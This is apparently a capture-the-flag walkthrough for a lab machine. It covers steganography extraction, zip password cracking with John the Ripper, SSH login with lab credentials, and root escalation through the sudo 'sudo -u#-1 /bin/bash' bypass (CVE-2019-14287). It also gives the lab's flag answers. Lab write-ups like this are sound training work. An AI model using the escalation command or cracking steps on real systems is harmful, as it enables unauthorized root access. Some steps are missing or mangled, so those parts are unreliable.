Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

> For the pictures, we see nothing special, and using the `exiftool` to see if there is any stored metadata, we get nothing.
> The next step is to see if there are any files hidden inside the images. Using the `binwalk` tool to do so.

```bash
binwalk cute-alien.jpg
```

> We see nothing except the image, trying the other image.

```shell
binwalk cutie.png
```

![](./screenshots/binwalk.png)

> We see that there is the PNG image itself, there is some compressed data that contains within it `R.txt`.
> Extracting this data from the picture using `binwalk with the -e` flag.

```
binwalk cutie.png -e
```

> We see that there is a new directory called `_cutie.png.extracted`, going into that directory and listing the elements we see a zip file called `8702.zip`.

> Trying to unzip the zip file isn't working, it is password protected.

> To crack the password, we use `John The Ripper`.
> But it first needs to be in a format that John can understand, so we first use the tool `zip2john`, and output that supported format into a new file that we can then use `john` on.

```
zip2john 8702.zip > 8702_new

Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

> We see that there is another user `james`, and his password is `hackerrules`.

###### Who is the other agent (in full name)? : `james` .

###### SSH password : `hackerrules!` .

> Using these credentials to login via SSH.
> The IP address changed because the machine terminated, use the target IP address.
```
ssh james@10.10.28.128
```
> Entering the password when prompted, and we entered via ssh as james.

> Listing the contents, we see the `user_flag.txt`, and an image `Alien_autopsy.jpg`.

> The image we want to view and play with, so we need to download it to our attacking machine.
> To do that, use the `scp` command from the attacking machine.

```
> We connect to `james@10.10.180.60`, the IP address changed since the machine terminated, and specify the path of the file we want, `Alien_autopsy.jpg`.
> We then specify where we want it downloaded on our attacking machine.

> Now that it is downloaded on our machine, we can do the reverse image search as given by the hint.
> Open google, and then click on the image icon and upload the picture.
> Once uploaded, switch to sources, and look for `foxnews` as given by the hint.
> Opening the link, we see the title.

> We see the text `Roswell alien autopsy`.

###### What is the incident of the photo called? : `Roswell alien autopsy` .

> Enumerating different methods to escalate privileges, i see nothing interesting until i try `sudo -l`.
> This command is used to see which commands the current user can run using `sudo`.

![](./screenshots/sudo-l.png)

> Searching up what `(ALL, !root) /bin/bash` means, we see the first link leading to this [exploit](https://www.exploit-db.com/exploits/47502).
> Defining this line:

1. This rule applies to user `james`.
2. `ALL` are the users the command can be executed as.
3. The `!root` are the groups the command can be executed as.
4. The `/bin/bash` is the command.

> To check the sudo version:
```
james@agent-sudo:~$ sudo -V
Sudo version 1.8.21p2
```
> We see that it is less than the version found in exploitdb link, `1.8.27`.

> The exploit is: 
```
sudo -u#-1 /bin/bash
```

> The exploit works because this sudo version doesn't doesn't check for existence of the specified user id, 1.
> `-u#-1` returns 0, which is the root users id.
> Therefore, it executes any command as root, and the given command here is `/bin/bash`, spawning for us a bash shell with root privileges.

###### CVE number for the escalation: `CVE-2019-14287` .

> Typing the exploit above into the terminal, we see that we are now root.

###### What is the root flag? : `b53a02f55b57d4439e3341834d70c062` .

###### (Bonus) Who is Agent R? : `DesKel` .
